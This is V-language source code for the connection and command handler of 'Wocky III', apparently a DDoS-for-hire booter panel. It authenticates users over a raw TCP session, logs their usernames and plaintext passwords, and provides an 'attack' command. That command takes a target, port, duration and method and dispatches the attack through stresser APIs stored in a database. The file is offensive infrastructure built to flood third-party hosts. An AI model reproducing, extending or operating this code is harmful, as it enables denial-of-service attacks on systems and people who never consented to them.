module wocky

import os
import io
import net
import time

import core
import auth
import crud
import config
import wocky
import utilities
import term_control
import attack_system
import wockyfx
import logger

import commands // List of Commands


pub fn connection_handler(mut socket net.TcpConn, mut w wocky.Wocky) { 
	mut reader := io.new_buffered_reader(reader: socket)
	mut buffer := core.Buffer{}
	user_addr := socket.peer_addr() or { return } // This should almost never return an err
	user_ip := "${user_addr}".replace("[::ffff:","").split("]:")[0]
	user_port := "${user_addr}".split("]:")[1]
	if wockyfx.check_for_wfx_file("upon_connect") && wockyfx.check_for_wfx_data("upon_connect") {
		w.wx.enable_socket_mode(mut socket)
		w.wx.set_file("${config.wfx_path}upon_connect.wfx", wockyfx.FileTypes.wfx)
		w.wx.parse_wfx()
	}

	mut username := ""
	mut password := ""

	if wockyfx.check_for_wfx_file("username_login") && wockyfx.check_for_wfx_file("password_login") {
		w.wx.enable_socket_mode(mut socket)
		w.wx.set_file("${config.wfx_path}username_login.wfx", wockyfx.FileTypes.wfx)
		w.wx.parse_wfx()
		username = reader.read_line() or { "" }
		if username == "" {
			username = ""
			password = ""
			socket.write_string("${config.Clear}${config.Red}[x] Error, Invalid username or password.....! exiting....") or { 0 }
			time.sleep(2*time.second)
			socket.close() or { return }
		}
		w.wx.enable_socket_mode(mut socket)
		w.wx.set_file("${config.wfx_path}password_login.wfx", wockyfx.FileTypes.wfx)
		w.wx.parse_wfx()
		password = reader.read_line() or { "" }
	} else {
		socket.write_string("${config.Red}Username: ${config.Default}") or { 0 }
		username = reader.read_line() or { "" }
		socket.write_string("${config.Red}Password: ${config.Black}") or { 0 }
		password = reader.read_line() or { "" }
		socket.write_string("${config.Default}") or { 0 }
	}

	logger.log_login(username, password, user_ip)

	// Have to do a auth check here with the username and password later
	mut login_check, user_info := auth.login(username, password, user_ip, mut w.sqlconn)
	if login_check == 0 {
		username = ""
		password = ""
		socket.write_string("${config.Clear}${config.Red}[x] Error, No user found.....! exiting....") or { 0 }
		time.sleep(3*time.second)
		socket.close() or { return }
	} else if login_check == -1 {
		username = ""
		password = ""
		socket.write_string("${config.Clear}${config.Red}[x] Error, Invalid username or password.....! exiting....") or { 0 }
		time.sleep(3*time.second)
		socket.close() or { return }
	}
	
	w.wx.set_info(user_info)

	if username == "" && password == "" {
		socket.close() or { return }
	}

	w.clients.add_session(username, mut socket, user_ip, user_port)
	if wockyfx.check_for_wfx_file("home") {
		w.wx.enable_socket_mode(mut socket)
		w.wx.set_file("${config.wfx_path}home.wfx", wockyfx.FileTypes.wfx)
		w.wx.parse_wfx()
	} else {
		socket.write_string("Welcome to Wocky III\r\n") or { 0 }
	}

	command_handler(mut socket, mut &w, user_info)
}

pub fn command_handler(mut socket net.TcpConn, mut w wocky.Wocky, db_user_info map[string]string) {
	mut username, ip, port := w.clients.get_session_info(mut socket)
	if username == "" {
		w.clients.remove_session(mut socket)
		socket.close() or { return }
	}
	mut buffer := core.Buffer{}
	mut reader := io.new_buffered_reader(reader: socket)
	// Grab all commands
	all_commands := wockyfx.get_all_cmds()
	mut input_cmd := ""
	w.wx.enable_socket_mode(mut socket)
	for {
		w.wx.set_info(db_user_info)
		// wockyfx.wfx_place_text_sock("13", "5", "${username}", mut socket)
		w.wx.enable_socket_mode(mut socket)
		// WockyFX Feature. Detecting a hostname file or use default hostname
		if wockyfx.check_for_wfx_file("hostname") && wockyfx.check_for_wfx_data("hostname") {
		w.wx.enable_socket_mode(mut socket)
		w.wx.set_file("${config.wfx_path}hostname.wfx", wockyfx.FileTypes.wfx)
			w.wx.parse_wfx()
		} else {
			socket.write_string("[Wocky@NET]~ $ ") or { 
				w.clients.remove_session(mut socket)
				socket.close() or { return }
				return 
			}
		}
		// Grabbing input or disconnecting user!
		input_cmd = reader.read_line() or { 
			w.clients.remove_session(mut socket)
			socket.close() or { return }
			return
		}
		w.wx.set_info(db_user_info)

		if input_cmd.len > 100 {
			w.clients.remove_session(mut socket)
			socket.close() or { return }
			return
		}
		w.wx.enable_socket_mode(mut socket)
		
		// Command Handling

		if input_cmd.replace("\r\n", "").len > 2 {
			println("here")
			buffer.parse(input_cmd)
			w.wx.set_buffer(buffer.full_cmd, buffer.cmd, buffer.cmd_args)

			println(buffer)
			if buffer.cmd == "attack" {
				// Do Attack Bullshit
				println("attk")
				if wockyfx.check_for_wfx_cmd("attack") && wockyfx.check_for_wfx_cmd_data("attack") {
					println("here 1")
					w.wx.set_file("${config.wfx_path}cmds/attack_cmd.wfx", wockyfx.FileTypes.wfx)
					println("here 2")
					mut max_arg, max_arg_err := wockyfx.check_for_max_argg("${config.wfx_path}cmds/attack_cmd.wfx")
					println("here 3")
					if buffer.cmd_args.len < max_arg {
						w.wx.parse_callback("set_arg_err_msg")
					} else {
						logger.log_attack(db_user_info, ip, buffer.full_cmd, buffer.cmd_args)
						println("testing this")
						mut api_names, api_urls/*, api_maxtime, api_conn*/ := crud.read_apis_with_method_alt(buffer.cmd_args[4])
						exit_c, t := attack_system.send_api_attack(buffer.cmd_args[1], buffer.cmd_args[2], buffer.cmd_args[3], buffer.cmd_args[4], db_user_info, mut w.sqlconn, api_names, api_urls)
						w.wx.enable_socket_mode(mut socket)
						w.wx.set_file("${config.wfx_cmd_path}attack_cmd.wfx", wockyfx.FileTypes.wfx)
						w.wx.parse_wfx()
						// socket.write_string(t) or { 0 }
					}
				}
			} else {
				println("here")
				// Loop throught commands
				mut cmd_found := false
				for i, cmd in all_commands {
					if buffer.cmd == cmd {
						cmd_found = true
						w.wx.enable_socket_mode(mut socket)
						w.wx.set_file("${config.wfx_path}cmds/${buffer.cmd}_cmd.wfx", wockyfx.FileTypes.wfx)
						w.wx.parse_wfx()
					}
				}

				if cmd_found == false {
					w.wx.enable_socket_mode(mut socket)
					w.wx.set_file("${config.wfx_path}cmds/invalid_cmd.wfx", wockyfx.FileTypes.wfx)
					w.wx.parse_wfx()
				}
			}
			w.wx.reset_buffer()
			logger.log_cmd(db_user_info, buffer.full_cmd, buffer.cmd_args)
		}
		// println(input_cmd)
	}

}